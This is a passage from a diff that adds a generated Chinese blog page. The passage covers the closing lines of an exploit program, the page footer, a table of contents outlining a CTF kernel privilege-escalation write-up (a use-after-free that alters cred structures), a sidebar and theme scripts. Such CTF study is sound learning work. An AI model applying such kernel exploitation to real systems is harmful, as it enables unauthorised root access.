class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[-] exploit failed&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<hr>
+<blockquote>
+<p>更新: 2026-05-10 09:07:55<br>原文: <a target="_blank" rel="noopener" href="https://www.yuque.com/idcm/wnemg9/glrgwhl99gf422y8">https://www.yuque.com/idcm/wnemg9/glrgwhl99gf422y8</a></p>
+</blockquote>
+
+    </div>
+    <footer class="article-footer">
+        <a class="article-category-link" href="/HFTTC.github.io/categories/Notes/" title="Notes" data-aos="zoom-in">Notes</a>
+
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/HFTTC.github.io/tags/pwn/" rel="tag" title="pwn">pwn</a></li></ul>
+
+    </footer>
+  </div>
+    <nav id="article-nav" aria-label="Article navigation" data-aos="fade-up">
+      <div class="article-nav-link-wrap left">
+            <img data-src="/HFTTC.github.io/images/banner.webp" data-sizes="auto" alt="Rust Pwn" class="lazyload">
+        <a href="/HFTTC.github.io/2026/05/23/RustPwn/" aria-label="前一篇: Rust Pwn" title="前一篇: Rust Pwn"></a>
+        <div class="article-nav-caption">前一篇</div>
+        <h3 class="article-nav-title">
+            Rust Pwn
+        </h3>
+      </div>
+    <div class="article-nav-link-wrap right">
+          <img data-src="/HFTTC.github.io/images/banner.webp" data-sizes="auto" alt="初识 KernelPWN" class="lazyload">
+      <a href="/HFTTC.github.io/2026/05/23/KernelPWN/%E5%88%9D%E8%AF%86KernelPWN/" aria-label="后一篇: 初识 KernelPWN"  title="后一篇: 初识 KernelPWN"></a>
+      <div class="article-nav-caption">后一篇</div>
+      <h3 class="article-nav-title">
+          初识 KernelPWN
+      </h3>
+    </div>
+  </nav>
+
+</article>
+
+
+</section>
+        </div>
+        <footer id="footer" aria-label="Site footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info">
+    <div>
+      <span class="icon-copyright"></span>
+        2020-2026
+        <span class="footer-info-sep rotate"></span>
+      HFTTC
+    </div>
+      <div>
+        基于&nbsp;<a href="https://hexo.io/" rel="noopener nofollow noreferrer" target="_blank">Hexo</a>&nbsp;
+        Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" rel="noopener nofollow noreferrer" target="_blank">Reimu</a>
+      </div>
+      <div>
+        <span class="icon-brush"></span>
+        223.6k
+        &nbsp;|&nbsp;
+        <span class="icon-coffee"></span>
+        18:25
+      </div>
+      <div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv">总访问量&nbsp;<span id="busuanzi_value_site_pv"></span></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv">总访客量&nbsp;<span id="busuanzi_value_site_uv"></span></span>
+      </div>
+  </div>
+</footer>
+
+          <div class="sidebar-top">
+            <div class="sidebar-top-taichi rotate"></div>
+            <div class="arrow-up"></div>
+          </div>
+        <div id="mask" class="hide"></div>
+      </div>
+      <nav id="mobile-nav" aria-label="Mobile navigation">
+  <div class="sidebar-wrap">
+        <div class="sidebar-toc-sidebar"><h3 class="toc-title">文章目录</h3>
+<div class="sidebar-toc-wrapper toc-div-class" >
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#CISCN-2017-kernel-babydriver"><span class="toc-number">1.</span> <span class="toc-text">[CISCN 2017]kernel-babydriver</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#checksec-%E6%A3%80%E6%9F%A5-babydriver-ko%EF%BC%9A"><span class="toc-number">1.1.</span> <span class="toc-text">checksec 检查 babydriver.ko：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#cat-boot-sh"><span class="toc-number">1.2.</span> <span class="toc-text">cat boot.sh</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#IDA-%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E9%A2%98%E7%9B%AE%EF%BC%9A"><span class="toc-number">1.3.</span> <span class="toc-text">IDA 静态分析题目：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#babyioctl%EF%BC%9A"><span class="toc-number">1.3.1.</span> <span class="toc-text">babyioctl：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#babywrite"><span class="toc-number">1.3.2.</span> <span class="toc-text">babywrite</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#babyread"><span class="toc-number">1.3.3.</span> <span class="toc-text">babyread</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#babyrelease"><span class="toc-number">1.3.4.</span> <span class="toc-text">babyrelease</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%EF%BC%9A"><span class="toc-number">1.4.</span> <span class="toc-text">漏洞利用：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BA%86%E8%A7%A3-thread-info%EF%BC%9A"><span class="toc-number">1.4.1.</span> <span class="toc-text">了解 thread_info：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#task-struct%EF%BC%9A"><span class="toc-number">1.4.2.</span> <span class="toc-text">task_struct：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#cred-struct%EF%BC%9A"><span class="toc-number">1.4.3.</span> <span class="toc-text">cred_struct：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%86%85%E6%A0%B8%E8%8E%B7%E5%8F%96-thread-info-%E5%9C%B0%E5%9D%80%E7%9A%84%E4%BB%A3%E7%A0%81%EF%BC%9A"><span class="toc-number">1.4.4.</span> <span class="toc-text">内核获取 thread_info 地址的代码：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP-%E6%80%9D%E8%B7%AF%EF%BC%9A"><span class="toc-number">1.5.</span> <span class="toc-text">EXP 思路：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9A%E4%B9%89%E5%8F%98%E9%87%8F%EF%BC%9A"><span class="toc-number">1.5.1.</span> <span class="toc-text">定义变量：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%87%BD%E6%95%B0%E8%BE%85%E5%8A%A9%E5%8C%BA%EF%BC%9A"><span class="toc-number">1.5.2.</span> <span class="toc-text">函数辅助区：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#UAF-%E7%AF%A1%E6%94%B9-cred-struct%EF%BC%9A"><span class="toc-number">1.5.3.</span> <span class="toc-text">UAF 篡改 cred_struct：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E6%89%A7%E8%A1%8C%E6%B5%81-Main-%E5%87%BD%E6%95%B0"><span class="toc-number">1.5.4.</span> <span class="toc-text">攻击执行流 -Main 函数</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%BB-EXP"><span class="toc-number">1.6.</span> <span class="toc-text">总 EXP:</span></a></li></ol></li></ol>
+</div>
+</div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/HFTTC.github.io/avatar/head.jpg" data-sizes="auto" alt="HFTTC" class="lazyload">
+  <div class="sidebar-author-name">HFTTC</div>
+  <div class="sidebar-description">心之所向，无问西东</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">132</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">1</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">1</div>
+  </div>
+</div>
+<div class="sidebar-social" >
+    <div class="icon-github sidebar-social-icon">
+      <a href=https://github.com/IDCM-svg itemprop="url" target="_blank" aria-label="github" rel="noopener nofollow noreferrer"></a>
+    </div>
+</div>
+<div class="sidebar-menu">
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/" aria-label="首页"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/catalog" aria-label="目录"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">目录</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/friend" aria-label="友链"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/archives" aria-label="归档"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/categories" aria-label="分类"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">分类</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/tags" aria-label="标签"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">标签</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/about" aria-label="关于"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+</div>
+</div>
+  </div>
+      <div class="sidebar-btn-wrapper">
+        <div class="sidebar-toc-btn current"></div>
+        <div class="sidebar-common-btn"></div>
+      </div>
+</nav>
+
+    </div>
+      <div class="site-search">
+        <div class="reimu-popup popup">
+          <div class="reimu-search">
+            <div class="reimu-search-input-icon"></div>
+            <div id="reimu-search-input"></div>
+            <div class="popup-btn-close"></div>
+          </div>
+          <div class="reimu-results">
+            <div id="reimu-stats"></div>
+            <div id="reimu-hits"></div>
+            <div id="reimu-pagination" class="reimu-pagination"></div>
+          </div>
+          <img class="reimu-bg" src="/HFTTC.github.io/images/reimu.png" loading="lazy" decoding="async" fetchpriority="low"/>
+        </div>
+      </div>
+    
+<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js" integrity="sha384-3gT&#x2F;vsepWkfz&#x2F;ff7PpWNUeMzeWoH3cDhm&#x2F;A8jM7ouoAK0&#x2F;fP&#x2F;9bcHHR5kHq2nf+e" crossorigin="anonymous"></script>
+
+
+<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js" integrity="sha384-J08i8An&#x2F;QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script>
+
+
+
+
+<script src="/HFTTC.github.io/js/script.js"></script>
+
+
+  
+<script src="/HFTTC.github.io/js/aos.js"></script>
+
+  <script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', aosInit);
+    } else {
+      aosInit();
+    }
+  </script>
+
+
+<script src="/HFTTC.github.io/js/pjax_script.js" data-pjax></script>
+
+
+  
+<script src="/HFTTC.github.io/js/generator_search.js" defer></script>
+
+
+
+  <script>
+    var setupFirework = () => {
+      if (!false || !window.matchMedia('(max-width: 768px)').matches) {
+        window.firework && window.firework(JSON.parse('{"excludeElements":["a","button"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["var(--red-1)","var(--red-2)","var(--red-3)","var(--red-4)"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["var(--red-0)"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'));
+      }
+    }
+  </script>
+  
+<script src="https://npm.webcache.cn/mouse-firework@0.2.0/dist/index.umd.js" integrity="sha384-qi9WggRt19tv8Vc7pCHW3ulMNLwrn515zaLEWZjl1px07vz8+pUoWX8n1rgq282T" crossorigin="anonymous" onload="setupFirework()" defer></script>
+
+
+
+
+
+
+<div id="lazy-script">
+  <div>
+      
+      
+      <script data-pjax>
+        window.REIMU_POST = {
+          author: "HFTTC",
+          title: "[CISCN 2017]kernel-babydriver",
+          url: "https://idcm-svg.github.io/HFTTC.github.io/2026/05/23/KernelPWN/%5BCISCN2017%5Dkernel-babydriver/",
+          excerpt: "",
+          description: "",
+          stripContent: "[CISCN 2017]kernel-babydriver作为一个刚刚涉足 kernelpwn 的萌新，由于大量未知的基础知识以及对 kernelpen 工具的陌生，一时不知道该从哪里学起，也不清楚整个 kernelpwn 大概是走什么样子的学习路线。既然如此，那就从题目开始熟悉 kernelpwn 上一篇文章我们通过 kernel-babydriver 这个题目初步了解整个题目提权的过程，这次就记录一下如何利用漏洞 checksec 检查 babydriver.ko： cat boot.sh ",
+          date: "Sat May 23 2026 02:46:58 GMT+0800",
+          updated: "Sat May 23 2026 02:58:43 GMT+0800",
+          cover: "/HFTTC.github.io/images/banner.webp",
+        };
+      </script>
+        
+<script src="/HFTTC.github.io/js/insert_highlight.js" data-pjax></script>
+
+      
+<script src="/HFTTC.github.io/js/tabs.js" data-pjax defer></script>
+
+      <script type="module" data-pjax>
+        (async () => {
+          const PhotoSwipeLightbox = (await safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe-lightbox.esm.min.js", "sha384-DiL6M/gG+wmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF/N6lrZi/")).default;
+          const initPswp = (gallery, children) => {
+            if (_$$(`${gallery} ${children}`).length > 0) {
+              new PhotoSwipeLightbox({
+                gallery,
+                children,
+                pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+              }).init();
+            }
+          }
+          const pswp = () => {
+            initPswp('.article-entry', 'a.article-gallery-item');
+            initPswp('.article-gallery', 'a.article-gallery-item');
+          }
+          pswp();
+        })();
+      </script>
+        
+
+
+  </div>
+</div>
+
+
+  <script>
+    console.log(String.raw`%c 
+ ______     ______     __     __    __     __  __    
+/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+ \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                  
+`,'color: #ff5252;')
+    console.log('%c Theme.Reimu v' + '1.12.3' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
+  </script>
+  
+
+
+  
+<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" integrity="sha384-0M75wtSkhjIInv4coYlaJU83+OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id+S" crossorigin="anonymous" async></script>
+
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.getRegistrations().then((registrations) => {
+      for (let registration of registrations) {
+        registration.unregister();
+      }
+    });
+  }
+</script>
+
+
+
+
+  </body>
+  </html>
